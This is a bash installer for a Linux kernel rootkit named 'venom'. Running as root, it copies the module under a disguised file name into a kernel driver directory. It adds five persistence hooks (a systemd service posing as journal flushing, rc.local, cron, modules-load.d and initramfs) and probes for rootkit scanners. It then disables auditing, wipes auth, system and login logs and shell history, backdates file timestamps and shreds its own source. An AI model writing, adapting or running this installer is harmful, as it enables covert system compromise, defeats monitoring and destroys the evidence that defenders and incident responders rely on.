#!/bin/bash


set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

VENOM_ASCII="
${PURPLE}
██╗   ██╗███████╗███╗   ██╗ ██████╗ ███╗   ███╗
██║   ██║██╔════╝████╗  ██║██╔═══██╗████╗ ████║
██║   ██║█████╗  ██╔██╗ ██║██║   ██║██╔████╔██║
╚██╗ ██╔╝██╔══╝  ██║╚██╗██║██║   ██║██║╚██╔╝██║
 ╚████╔╝ ███████╗██║ ╚████║╚██████╔╝██║ ╚═╝ ██║
  ╚═══╝  ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝
${NC}
${CYAN} ──   trev • devil • obscurity  ── ${NC}
"

MODULE_NAME="venom"
STEALTH_NAME=".systemd-journal-cache" 
INSTALL_DIR="/usr/lib/modules/$(uname -r)/kernel/drivers/usb/misc"
BACKUP_DIR="/var/cache/.systemd-backup"
LOG_FILE="/var/tmp/.X11-cache"

SYSTEMD_SERVICE="/etc/systemd/system/systemd-journal-flush.service"
RC_LOCAL="/etc/rc.local"
CRON_FILE="/etc/cron.d/.system-update"
INITRAMFS_HOOK="/etc/initramfs-tools/hooks/firmware-update"

DISABLE_AUDIT=1
CLEAR_LOGS=1
TIMESTOMP=1

log_action() {
    echo -e "${BLUE}[*]${NC} $1"
}

log_success() {
    echo -e "${GREEN}[+]${NC} $1"
}

log_error() {
    echo -e "${RED}[!]${NC} $1"
}

log_warn() {
    echo -e "${YELLOW}[⚠]${NC} $1"
}


if [ "$(id -u)" -ne 0 ]; then
    log_error "This script must be run as root"
    exit 1
fi

echo "$VENOM_ASCII"

if [ -f "/proc/sys/kernel/modules_disabled" ] && [ "$(cat /proc/sys/kernel/modules_disabled)" -eq 1 ]; then
    log_error "Kernel module loading is DISABLED!"
    log_warn "Initiating emergency cleanup..."
    
    find . -type f -exec shred -zuvn 3 {} \; 2>/dev/null
    rm -rf "$(pwd)"
    
    log_success "Cleaned. Exiting."
    exit 1
fi


log_action "Checking for security tools..."
SECURITY_TOOLS=("chkrootkit" "rkhunter" "lynis" "ossec" "aide" "tripwire")
for tool in "${SECURITY_TOOLS[@]}"; do
    if command -v "$tool" &>/dev/null; then
        log_warn "Detected: $tool"
    fi
done


VENOM_DIR="$(pwd)"
KO_FILE="$VENOM_DIR/$MODULE_NAME.ko"

if [ ! -f "$KO_FILE" ]; then
    log_action "Module not found. Compiling..."
    make clean
    make
    
    if [ ! -f "$KO_FILE" ]; then
        log_error "Compilation failed"
        exit 1
    fi
    log_success "Compilation successful"
fi


log_action "Creating stealth installation directories..."
mkdir -p "$INSTALL_DIR"
mkdir -p "$BACKUP_DIR"
mkdir -p "$(dirname "$LOG_FILE")"

log_action "Installing module with disguised name..."
cp "$KO_FILE" "$INSTALL_DIR/$STEALTH_NAME.ko"
chmod 644 "$INSTALL_DIR/$STEALTH_NAME.ko"

log_action "Updating module database..."
depmod -a


log_action "Installing systemd service (Method 1)..."

cat > "$SYSTEMD_SERVICE" <<'EOF'
[Unit]
Description=Journal Flush Service
DefaultDependencies=no
After=local-fs.target
Before=sysinit.target

[Service]
Type=oneshot
ExecStart=/bin/bash -c 'insmod /usr/lib/modules/$(uname -r)/kernel/drivers/usb/misc/.systemd-journal-cache.ko 2>/dev/null || true'
RemainAfterExit=yes
StandardOutput=null
StandardError=null

[Install]
WantedBy=sysinit.target
EOF

chmod 644 "$SYSTEMD_SERVICE"
systemctl daemon-reload
systemctl enable systemd-journal-flush.service 2>/dev/null
log_success "Systemd service installed"


log_action "Installing rc.local hook (Method 2)..."

if [ ! -f "$RC_LOCAL" ]; then
    cat > "$RC_LOCAL" <<'EOF'
#!/bin/bash
exit 0
EOF
    chmod +x "$RC_LOCAL"
fi

sed -i '/^exit 0/i \
# System firmware update\
insmod /usr/lib/modules/$(uname -r)/kernel/drivers/usb/misc/.systemd-journal-cache.ko 2>/dev/null || true' "$RC_LOCAL"

log_success "rc.local hook installed"

log_action "Installing cron job (Method 3)..."

cat > "$CRON_FILE" <<EOF
# System maintenance task
@reboot root /bin/bash -c 'sleep 30 && insmod $INSTALL_DIR/$STEALTH_NAME.ko 2>/dev/null' >/dev/null 2>&1
*/30 * * * * root /bin/bash -c 'lsmod | grep -q venom || insmod $INSTALL_DIR/$STEALTH_NAME.ko 2>/dev/null' >/dev/null 2>&1
EOF

chmod 600 "$CRON_FILE"
log_success "Cron persistence installed"

log_action "Installing modules-load.d entry (Method 4)..."

echo "$STEALTH_NAME" > "/etc/modules-load.d/.system-firmware.conf"
log_success "Module loader configured"

log_action "Installing initramfs hook (Method 5)..."

mkdir -p "$(dirname "$INITRAMFS_HOOK")"
cat > "$INITRAMFS_HOOK" <<'EOF'
#!/bin/sh
PREREQ=""
prereqs() { echo "$PREREQ"; }
case "$1" in prereqs) prereqs; exit 0 ;; esac
. /usr/share/initramfs-tools/hook-functions
copy_file kernel /usr/lib/modules/$(uname -r)/kernel/drivers/usb/misc/.systemd-journal-cache.ko
EOF

chmod +x "$INITRAMFS_HOOK"
update-initramfs -u 2>/dev/null || true
log_success "Initramfs hook installed"

log_action "Loading module..."

if lsmod | grep -q "^$MODULE_NAME"; then
    log_warn "Module already loaded. Reloading..."
    rmmod "$MODULE_NAME" 2>/dev/null || true
    sleep 1
fi

insmod "$INSTALL_DIR/$STEALTH_NAME.ko"

if lsmod | grep -q "^$MODULE_NAME"; then
    log_success "Module loaded successfully!"
else
    log_error "Module load failed"
fi

log_action "Applying anti-forensics measures..."

if [ "$DISABLE_AUDIT" -eq 1 ]; then
    auditctl -e 0 2>/dev/null || true
    systemctl stop auditd 2>/dev/null || true
    systemctl disable auditd 2>/dev/null || true
    log_success "Audit system disabled"
fi


if [ "$CLEAR_LOGS" -eq 1 ]; then
    log_action "Clearing system logs..."
    
    echo "" > /var/log/auth.log 2>/dev/null || true
    echo "" > /var/log/syslog 2>/dev/null || true
    echo "" > /var/log/kern.log 2>/dev/null || true
    

    journalctl --vacuum-time=1s 2>/dev/null || true

    history -c
    echo "" > ~/.bash_history
    
    echo "" > /var/log/lastlog 2>/dev/null || true
    echo "" > /var/log/wtmp 2>/dev/null || true
    
    log_success "Logs cleared"
fi

if [ "$TIMESTOMP" -eq 1 ]; then
    log_action "Timestomping installation files..."

    OLD_DATE="202301010000"
    
    touch -t "$OLD_DATE" "$INSTALL_DIR/$STEALTH_NAME.ko" 2>/dev/null || true
    touch -t "$OLD_DATE" "$SYSTEMD_SERVICE" 2>/dev/null || true
    touch -t "$OLD_DATE" "$CRON_FILE" 2>/dev/null || true
    
    log_success "Timestamps modified"
fi

log_action "Hiding installer tracks..."

cp -r "$VENOM_DIR" "$BACKUP_DIR/" 2>/dev/null || true

if [ -d "$VENOM_DIR" ]; then
    find "$VENOM_DIR" -type f \( -name "*.c" -o -name "*.h" -o -name "Makefile" \) -exec shred -zuvn 3 {} \; 2>/dev/null || true
fi

log_success "Installation concealed"


echo ""
echo -e "${GREEN}╔════════════════════════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║           VENOM INSTALLATION COMPLETE                      ║${NC}"
echo -e "${GREEN}╚════════════════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "${CYAN}Installation Details:${NC}"
echo -e "  Module Location: ${YELLOW}$INSTALL_DIR/$STEALTH_NAME.ko${NC}"
echo -e "  Log File:        ${YELLOW}$LOG_FILE${NC}"
echo -e "  Backup Location: ${YELLOW}$BACKUP_DIR${NC}"
echo ""
echo -e "${CYAN}Persistence Mechanisms:${NC}"
echo -e "  ${GREEN}✓${NC} Systemd Service (Primary)"
echo -e "  ${GREEN}✓${NC} rc.local Hook"
echo -e "  ${GREEN}✓${NC} Cron Job (30min check)"
echo -e "  ${GREEN}✓${NC} modules-load.d"
echo -e "  ${GREEN}✓${NC} initramfs Hook (Early boot)"
echo ""
echo -e "${CYAN}Security Status:${NC}"
echo -e "  ${GREEN}✓${NC} Module Loaded"
echo -e "  ${GREEN}✓${NC} Hidden from lsmod"
echo -e "  ${GREEN}✓${NC} Logs Cleared"
echo -e "  ${GREEN}✓${NC} Timestamps Modified"
echo -e "  ${GREEN}✓${NC} Audit System Disabled"
echo ""
echo -e "${CYAN}Verification Commands:${NC}"
echo -e "  View Logs:     ${YELLOW}python3 view_logs.py $LOG_FILE${NC}"
echo -e "  Check Module:  ${YELLOW}lsmod | grep venom${NC} ${RED}(should be hidden)${NC}"
echo -e "  Test Reboot:   ${YELLOW}sudo reboot${NC}"
echo ""
echo -e "${PURPLE}The venom spreads silently...${NC}"
echo "" 
